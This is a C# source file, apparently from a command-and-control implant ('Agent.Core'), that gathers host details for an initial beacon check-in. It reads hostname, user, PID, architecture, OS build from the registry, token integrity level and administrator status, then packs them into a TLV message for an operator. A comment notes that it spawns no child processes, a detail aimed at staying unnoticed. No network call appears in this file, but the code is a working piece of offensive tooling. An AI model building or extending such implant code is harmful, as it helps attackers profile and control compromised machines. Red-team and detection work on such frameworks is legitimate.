using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using Agent.Interop;
using Agent.Protocol;

namespace Agent.Core
{
    /// <summary>
    /// Collects system information for the initial check-in.
    /// Uses P/Invoke and .NET APIs — no child processes spawned.
    /// </summary>
    public static class SysInfo
    {
        public static byte[] CollectCheckinTlv(byte[] agentId)
        {
            var tlv = new TlvBuilder();

            tlv.AddUuid(Constants.TLV_AGENT_ID, agentId);
            tlv.AddString(Constants.TLV_HOSTNAME, Environment.MachineName);

            // Username: DOMAIN\user
            try
            {
                tlv.AddString(Constants.TLV_USERNAME,
                    WindowsIdentity.GetCurrent().Name);
            }
            catch
            {
                tlv.AddString(Constants.TLV_USERNAME,
                    Environment.UserDomainName + "\\" + Environment.UserName);
            }

            // PID / PPID
            var proc = Process.GetCurrentProcess();
            tlv.AddUInt32(Constants.TLV_PID, (uint)proc.Id);
            // PPID not easily available in .NET 4.0 without NtQueryInformationProcess
            tlv.AddUInt32(Constants.TLV_PPID, 0);

            // Architecture
            tlv.AddUInt8(Constants.TLV_ARCH,
                (byte)(Environment.Is64BitProcess ? 0x02 : 0x01));

            // OS version from registry
            string osVersion = GetOsVersion();
            tlv.AddString(Constants.TLV_OS_VERSION, osVersion);

            // Integrity level
            byte integrity = GetIntegrityLevel();
            tlv.AddUInt8(Constants.TLV_INTEGRITY, integrity);

            // Admin check
            bool isAdmin = IsAdmin();
            tlv.AddUInt8(Constants.TLV_IS_ADMIN, (byte)(isAdmin ? 1 : 0));

            // Process name
            try
            {
                tlv.AddString(Constants.TLV_PROCESS_NAME, proc.ProcessName);
            }
            catch
            {
                tlv.AddString(Constants.TLV_PROCESS_NAME, "unknown");
            }

            // .NET version
            tlv.AddString(Constants.TLV_DOTNET_VERSION,
                Environment.Version.ToString());

            // Agent version
            tlv.AddString(Constants.TLV_AGENT_VERSION, "1.0.0");

            // CWD
            tlv.AddString(Constants.TLV_CWD, Environment.CurrentDirectory);

            return tlv.Build();
        }

        private static string GetOsVersion()
        {
            try
            {
                IntPtr hKey;
                int result = Advapi32.RegOpenKeyExW(
                    Advapi32.HKEY_LOCAL_MACHINE,
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                    0, Advapi32.KEY_READ, out hKey);

                if (result != 0) return Environment.OSVersion.VersionString;

                string productName = ReadRegString(hKey, "ProductName");
                string buildNumber = ReadRegString(hKey, "CurrentBuildNumber");
                Advapi32.RegCloseKey(hKey);

                return string.Format("{0} Build {1}", productName, buildNumber);
            }
            catch
            {
                return Environment.OSVersion.VersionString;
            }
        }

        private static string ReadRegString(IntPtr hKey, string valueName)
        {
            uint type;
            uint size = 256;
            byte[] data = new byte[size];
            int result = Advapi32.RegQueryValueExW(hKey, valueName, IntPtr.Zero,
                out type, data, ref size);
            if (result != 0) return "";
            return Encoding.Unicode.GetString(data, 0, (int)size).TrimEnd('\0');
        }

        private static byte GetIntegrityLevel()
        {
            // 0=LOW, 1=MEDIUM, 2=HIGH, 3=SYSTEM
            try
            {
                IntPtr hToken;
                if (!Advapi32.OpenProcessToken(Kernel32.GetCurrentProcess(),
                    Advapi32.TOKEN_QUERY, out hToken))
                    return 1; // default MEDIUM

                uint retLen;
                Advapi32.GetTokenInformation(hToken, Advapi32.TokenIntegrityLevel,
                    IntPtr.Zero, 0, out retLen);

                IntPtr pTil = System.Runtime.InteropServices.Marshal.AllocHGlobal((int)retLen);
                try
                {
                    if (!Advapi32.GetTokenInformation(hToken, Advapi32.TokenIntegrityLevel,
                        pTil, retLen, out retLen))
                        return 1;

                    // TOKEN_MANDATORY_LABEL → Label.Sid → last sub-authority
                    IntPtr pSid = System.Runtime.InteropServices.Marshal.ReadIntPtr(pTil);
                    // GetSidSubAuthority for last sub-authority
                    // Integrity levels: 0x0000=Untrusted, 0x1000=Low, 0x2000=Medium,
                    //                   0x3000=High, 0x4000=System
                    int subAuthCount = System.Runtime.InteropServices.Marshal.ReadByte(pSid, 1);
                    // Sub-authority is at offset 8 + (subAuthCount-1)*4
                    int offset = 8 + (subAuthCount - 1) * 4;
                    uint rid = (uint)System.Runtime.InteropServices.Marshal.ReadInt32(pSid, offset);

                    if (rid >= 0x4000) return 3; // SYSTEM
                    if (rid >= 0x3000) return 2; // HIGH
                    if (rid >= 0x2000) return 1; // MEDIUM
                    return 0; // LOW
                }
                finally
                {
                    System.Runtime.InteropServices.Marshal.FreeHGlobal(pTil);
                    Kernel32.CloseHandle(hToken);
                }
            }
            catch
            {
                return 1;
            }
        }

        private static bool IsAdmin()
        {
            try
            {
                var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }
    }
}
